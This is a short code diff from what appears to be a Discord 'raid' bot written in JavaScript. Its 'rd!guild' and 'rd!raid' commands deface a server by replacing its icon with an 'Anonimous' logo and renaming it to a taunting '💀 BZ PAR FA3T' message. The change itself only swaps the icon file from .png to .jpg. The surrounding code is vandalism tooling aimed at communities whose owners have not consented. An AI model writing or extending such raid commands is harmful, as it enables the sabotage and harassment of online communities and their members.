@@ -66,12 +66,12 @@ client.on('message', msg => {
     }
 
     if(msg.content === "rd!guild"){
-        msg.guild.setIcon("AnonimousLogo.png").catch(e => {});
+        msg.guild.setIcon("AnonimousLogo.jpg").catch(e => {});
         msg.guild.setName("💀 BZ PAR FA3T")
     }
 
     if(msg.content === "rd!raid"){
-        msg.guild.setIcon("AnonimousLogo.png").catch(e => {});
+        msg.guild.setIcon("AnonimousLogo.jpg").catch(e => {});
         msg.guild.setName("💀 BZ PAR FA3T")
     }
 
